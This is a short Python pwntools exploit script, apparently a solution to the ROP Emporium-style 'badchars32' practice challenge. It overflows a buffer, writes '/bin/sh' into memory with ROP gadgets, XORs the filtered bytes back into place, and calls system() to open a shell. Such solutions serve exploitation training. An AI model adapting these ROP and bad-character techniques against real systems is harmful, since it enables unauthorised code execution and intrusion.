from pwn import *

badchars = 'bic/ fns'

# xor BYTE PTR [ebx],cl; ret;
gadget1 = 0x08048890
# mov DWORD PTR [edi],esi; ret;
gadget2 = 0x08048893
# pop ebx; pop ecx; ret;
gadget3 = 0x08048896
# pop esi; pop edi; ret;
gadget4 = 0x08048899

system = 0x80484e0
buffer = 0x0804a038
string = '/bin/sh\x00'

def badchar_xor(c):
    return chr(ord(c) ^ 0xeb)

# build rop gadgets to fix
# badchars in memory
def build_rop_gadget(s):
    payload = ''
    for i in xrange(len(s)):
        if s[i] in badchars:
            payload += p32(gadget3)
            payload += p32(buffer + i)
            payload += badchar_xor(s[i]).ljust(4, '\x00')
            payload += p32(gadget1)

    return payload

p = process('./badchars32')

payload = 'a' * 44
payload += p32(gadget4)
payload += string[0:4]
payload += p32(buffer)

payload += p32(gadget2)

payload += p32(gadget4)
payload += string[4:]
payload += p32(buffer + 4)

payload += p32(gadget2)

payload += build_rop_gadget(string)

payload += p32(system)
payload += 'dddd'
payload += p32(buffer)

p.sendline(payload)
p.interactive()
